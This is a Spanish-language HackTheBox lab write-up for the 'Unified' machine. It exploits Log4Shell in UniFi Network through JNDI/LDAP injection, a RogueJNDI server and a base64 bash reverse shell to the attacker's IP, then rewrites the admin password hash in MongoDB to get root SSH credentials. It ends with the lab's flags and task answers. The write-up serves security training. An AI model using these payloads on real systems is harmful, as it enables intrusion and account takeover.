# HTB — Unified | WriteUp

**Dificultad:** Easy | **OS:** Linux | **Vulnerabilidad principal:** Log4Shell (CVE-2021-44228)

---

## ¿De qué va esta máquina?

Unified es una máquina Linux de nivel Easy en HackTheBox. El objetivo es explotar **Log4Shell**, una de las vulnerabilidades más críticas de la historia reciente (CVSS 10.0), presente en el software de gestión de redes **UniFi Network 6.4.54**.

La cadena de ataque es:

1. Detectar el servicio UniFi vulnerable en el puerto 8443
2. Inyectar un payload JNDI/LDAP en el campo `remember` del login para conseguir una reverse shell
3. Acceder a MongoDB internamente para cambiar la contraseña del admin
4. Entrar al panel web y obtener las credenciales SSH de root
5. Capturar las flags

---

## Preparación

```bash
sudo openvpn starting_points_eu-starting-point-1-dhcp.ovpn
ping -c 1 10.129.66.128
settarget 10.129.66.128 Unified
```

![[Pasted image 20260408164944.png]]

---

## Fase 1 — Reconocimiento

### Escaneo Nmap

```bash
nmap -A -p- 10.129.66.128 -oN escaneo
```

**Flags usados:**

- `-A` → Activa detección de OS, versiones, scripts y traceroute
- `-p-` → Escanea los 65535 puertos (no solo los 1000 por defecto)
- `-oN escaneo` → Guarda el output en un archivo llamado `escaneo`

![[Pasted image 20260408171001.png]]

**Resultado relevante:**

```
22/tcp   open  ssh             OpenSSH 8.2p1
6789/tcp filtered ibm-db2-admin
8080/tcp open  http            Apache Tomcat
8443/tcp open  ssl/nagios-nsca Nagios NSCA
8843/tcp open  ssl/http        Apache Tomcat
8880/tcp open  http            Apache Tomcat
```

> **Task 1 — ¿Cuáles son los primeros 4 puertos abiertos?** **Respuesta: 22, 6789, 8080, 8443**

---

### Inspección del servicio en puerto 8443

Abrimos en el navegador: `https://10.129.66.128:8443`

Nos redirige a un panel de login de **UniFi Network**. En el footer o en la página de login se puede ver la versión del software.

![[Pasted image 20260408171427.png]]

> **Task 2 — ¿Cuál es el título del software que corre en el puerto 8443?** **Respuesta: UniFi Network**

Vamos a `http://IP:8443` en el navegador y observamos la versión:

![[Pasted image 20260408172434.png]]

> **Task 3 — ¿Cuál es la versión del software?** **Respuesta: 6.4.54**

También podemos obtenerlo via curl:

```bash
curl -sk https://10.129.66.128:8443/manage/account/login | grep -i version
```

- `-s` → Silent: no muestra barra de progreso ni errores
- `-k` → Insecure: ignora errores SSL (el certificado está expirado/autofirmado, sin este flag curl rechaza la conexión)

---

## Fase 2 — Investigación de la vulnerabilidad

Buscamos en Google: `UniFi 6.4.54 CVE`

![[Pasted image 20260408172948.png]]

Encontramos que esta versión es vulnerable a **Log4Shell**.

### ¿Qué es Log4Shell?

**Log4j** es una librería Java de logging (registro de eventos) usada en millones de aplicaciones. En diciembre de 2021 se descubrió que era posible hacer que Log4j ejecutara código arbitrario simplemente enviando una cadena especial en cualquier campo que fuera registrado por la aplicación.

La cadena maliciosa tiene este formato:

```
${jndi:ldap://IP_ATACANTE:PUERTO/ruta}
```

Cuando Log4j ve `${...}`, lo interpreta como una expresión a evaluar. **JNDI** (Java Naming and Directory Interface) es la API de Java para servicios de directorio, y **LDAP** es el protocolo que usa para conectarse al servidor del atacante.

> **Task 4 — ¿Cuál es el CVE de la vulnerabilidad?** **Respuesta: CVE-2021-44228**

![[Pasted image 20260408173637.png]]

> **Task 5 — ¿Qué protocolo usa JNDI en la inyección?** **Respuesta: LDAP** (Lightweight Directory Access Protocol)

Referencia: https://www.ibm.com/es-es/think/topics/log4shell

---

## Fase 3 — Verificación de la vulnerabilidad

Antes de explotar, verificamos que el target es vulnerable usando **tcpdump** para comprobar si la máquina se conecta de vuelta a nosotros al recibir el payload.

### Paso 1: Obtener nuestra IP de tun0

```bash
ip a show tun0
```

Anotamos la IP (en este caso: `10.10.15.108`).

### Paso 2: Ponerse en escucha con tcpdump

```bash
sudo tcpdump -i tun0 port 389
```

- `-i tun0` → Escucha en la interfaz VPN de HTB
- `port 389` → Solo captura tráfico LDAP (el protocolo que usará el payload)

> **Task 6 — ¿Qué herramienta usamos para interceptar el tráfico?** **Respuesta: tcpdump**

> **Task 7 — ¿Qué puerto inspeccionamos en el tráfico interceptado?** **Respuesta: 389** (puerto por defecto de LDAP)

### Paso 3: Interceptar el login con Burp Suite

Abrimos Burp Suite y configuramos FoxyProxy para redirigir el tráfico al proxy. Intentamos hacer login con credenciales aleatorias:

![[Pasted image 20260408183758.png]]

![[Pasted image 20260408183830.png]]

En Burp → Proxy → HTTP History encontramos el `POST /api/login` y lo enviamos al Repeater.

### Paso 4: Modificar el campo `remember` con el payload de prueba

En Burp Repeater modificamos el JSON. **Importante:** el payload debe estar en una sola línea sin saltos.

```json
{
  "username": "admin",
  "password": "admin",
  "remember": "${jndi:ldap://10.10.15.108/test}",
  "strict": true
}
```

![[Pasted image 20260408184149.png]]

Aunque el servidor responda con error, no importa:

![[Pasted image 20260408184248.png]]

Vamos al terminal con tcpdump y vemos si llega tráfico desde la víctima:

![[Pasted image 20260408184317.png]]

Si aparece tráfico → **la máquina es vulnerable a Log4Shell**.

---

## Fase 4 — Explotación (Reverse Shell)

### Requisitos previos

```bash
java --version
mvn -v
```

Si no están instalados:

```bash
sudo apt install openjdk-11-jdk
sudo apt-get install maven
```

Usamos JDK 11 por su compatibilidad y soporte a largo plazo (aunque existan versiones más nuevas).

### Paso 1: Clonar y compilar RogueJNDI

**RogueJNDI** es un servidor LDAP malicioso. Cuando la víctima realiza el JNDI lookup y se conecta a él, RogueJNDI le devuelve nuestro payload (la reverse shell).

```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```

![[Pasted image 20260408184731.png]]

Después de compilar veremos el archivo `target/RogueJndi-1.1.jar`:

![[Pasted image 20260408184809.png]]

### Paso 2: Crear el payload en Base64

Necesitamos encodear el comando de reverse shell en Base64 para evitar problemas con caracteres especiales (`>`, `&`, `/`) que podrían romperse al viajar por LDAP o ser interpretados por la shell del servidor.

Como usamos zsh (que no soporta `/dev/tcp`), ejecutamos el echo con bash:

```bash
bash -c "echo 'bash -i >& /dev/tcp/10.10.15.108/4444 0>&1' | base64"
```

![[Pasted image 20260408185049.png]]

Copiamos el output Base64 para usarlo en el siguiente paso.

### Paso 3: Lanzar RogueJNDI con el payload

```bash
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMDgvNDQ0NCAwPiYxCg==}|{base64,-d}|{bash,-i}" --hostname "10.10.15.108"
```

![[Pasted image 20260408185443.png]]

En el terminal veremos entradas para distintos frameworks: WebSphere, Tomcat, Groovy... Necesitamos la de **Tomcat** porque UniFi usa Apache Tomcat como servidor de aplicaciones:

![[Pasted image 20260408185604.png]]

### Paso 4: Ponerse en escucha con netcat

En un nuevo terminal:

```bash
nc -lvp 4444
```

- `-l` → Modo escucha (listen)
- `-v` → Verbose, muestra más información
- `-p 4444` → Puerto donde esperamos la conexión de la reverse shell

### Paso 5: Enviar el payload final desde Burp

En Burp Repeater modificamos el campo `remember` para apuntar al puerto 1389 de RogueJNDI y a la entrada de Tomcat. **Todo en una sola línea:**

![[Pasted image 20260408190437.png]]

```json
{
  "username": "admin",
  "password": "admin",
  "remember": "${jndi:ldap://10.10.15.108:1389/o=tomcat}",
  "strict": true
}
```

En RogueJNDI aparece la confirmación de conexión desde Tomcat:

![[Pasted image 20260408190501.png]]

Y en nuestro netcat recibimos la shell:

![[Pasted image 20260408190529.png]]

Verificamos con `whoami`:

![[Pasted image 20260408190547.png]]

### Paso 6: Estabilizar la shell

La reverse shell básica es inestable (no hay historial, las flechas no funcionan, etc.). La estabilizamos:

```bash
script /dev/null -c bash
export TERM=xterm
```

- `script /dev/null -c bash` → Crea una pseudo-terminal más completa
- `export TERM=xterm` → Permite usar `clear`, flechas del teclado, etc.

---

## Fase 5 — User Flag

```bash
ls /home
ls /home/michael
cat /home/michael/user.txt
```

![[Pasted image 20260408190947.png]]

**User flag:** `6ced1a6a89e666c0620cdb10262ba127`

---

## Fase 6 — Escalada de privilegios

### Descubrir MongoDB

UniFi usa MongoDB como base de datos. Buscamos el proceso:

```bash
ps aux | grep mongo
```

- `ps aux` → Lista todos los procesos del sistema con detalles
- `grep mongo` → Filtra solo los que contienen "mongo"

![[Pasted image 20260408191054.png]]

Encontramos MongoDB corriendo internamente en el **puerto 27117** (no estándar, invisible desde fuera).

> **Task 8 — ¿En qué puerto corre MongoDB?** **Respuesta: 27117**

El puerto 27017 (por defecto) está cerrado externamente. UniFi lo tiene movido al 27117 internamente.

### Leer la base de datos de UniFi

UniFi usa una base de datos MongoDB llamada **`ace`** que almacena toda la configuración, incluyendo los usuarios administradores.

> **Task 9 — ¿Cuál es el nombre de la base de datos por defecto de UniFi?** **Respuesta: ace**

```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

- `mongo --port 27117` → Conecta a MongoDB en el puerto 27117
- `ace` → Nombre de la base de datos a usar
- `db.admin.find()` → Recupera todos los documentos de la colección `admin`
- `.forEach(printjson)` → Los muestra en formato JSON legible

> **Task 10 — ¿Qué función usamos para enumerar usuarios en MongoDB?** **Respuesta: db.admin.find()**

![[Pasted image 20260408191611.png]]

![[Pasted image 20260408191514.png]]

Encontramos el usuario administrador con el campo `x_shadow` que contiene la contraseña hasheada. Empieza por `$6$` → SHA-512 con salt. Crackearlo no es viable, pero podemos **reemplazarlo directamente**.

### Cambiar la contraseña del admin

**Paso 1:** Reemplazar temporalmente con texto plano para verificar que funciona:

```bash
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"Password1234"}})'
```

> **Task 11 — ¿Qué función usamos para actualizar usuarios en MongoDB?** **Respuesta: db.admin.update()**

![[Pasted image 20260408191747.png]]

Confirmamos el cambio:

```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

![[Pasted image 20260408191925.png]]

**Paso 2:** Generar el hash SHA-512 de nuestra contraseña (en nuestra máquina Kali):

```bash
mkpasswd -m sha-512 Password1234
```

**¿Por qué hashear?** Porque UniFi espera el password en formato SHA-512. Si dejamos "Password1234" en texto plano en el campo `x_shadow`, al intentar hacer login no coincidirá con el formato esperado y no podremos entrar.

Output (el salt es aleatorio, el tuyo será diferente):

```
$6$iVYmB08h4PtjdsGa$FQlzVC7fcR32pjTzP5gw2v7M/aWyHEUQeVNmkhBntL1/i5R7nc6ZspGvts8ToXTz3WFsEznvAjKJL/.kM.cnu1
```

**Paso 3:** Actualizar con el hash SHA-512 real:

```bash
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$iVYmB08h4PtjdsGa$FQlzVC7fcR32pjTzP5gw2v7M/aWyHEUQeVNmkhBntL1/i5R7nc6ZspGvts8ToXTz3WFsEznvAjKJL/.kM.cnu1"}})'
```

![[Pasted image 20260408192321.png]]

### Acceder al panel de UniFi

En el navegador vamos a `https://10.129.66.128:8443` y hacemos login con, quitando interceptación del burp:

- **Usuario:** `administrator`
- **Contraseña:** `Password1234`

![[Pasted image 20260408192556.png]]

Nos redirige al dashboard:

![[Pasted image 20260408192611.png]]

En **Settings → Site** encontramos las credenciales SSH de root en texto claro:

![[Pasted image 20260408192701.png]]

```
root:NotACrackablePassword4U2022
```

---

## Fase 7 — Root Flag

```bash
ssh root@10.129.66.128
# Password: NotACrackablePassword4U2022
```

![[Pasted image 20260408192827.png]]

```bash
cat /root/root.txt
```

**Root flag:** `e50bc93c75b634e4b272d2f771c33681`

> **Task 12 — ¿Cuál es la contraseña de root?** **Respuesta: NotACrackablePassword4U2022**

---

## Resumen de Tasks

|Task|Pregunta|Respuesta|
|---|---|---|
|1|Primeros 4 puertos abiertos|22, 6789, 8080, 8443|
|2|Título del software en puerto 8443|UniFi Network|
|3|Versión del software|6.4.54|
|4|CVE de la vulnerabilidad|CVE-2021-44228|
|5|Protocolo que usa JNDI|LDAP|
|6|Herramienta para interceptar tráfico|tcpdump|
|7|Puerto a inspeccionar|389|
|8|Puerto de MongoDB|27117|
|9|Base de datos de UniFi|ace|
|10|Función para enumerar usuarios|db.admin.find()|
|11|Función para actualizar usuarios|db.admin.update()|
|12|Contraseña de root|NotACrackablePassword4U2022|

---

## Flags

- **User flag:** `6ced1a6a89e666c0620cdb10262ba127`
- **Root flag:** `e50bc93c75b634e4b272d2f771c33681`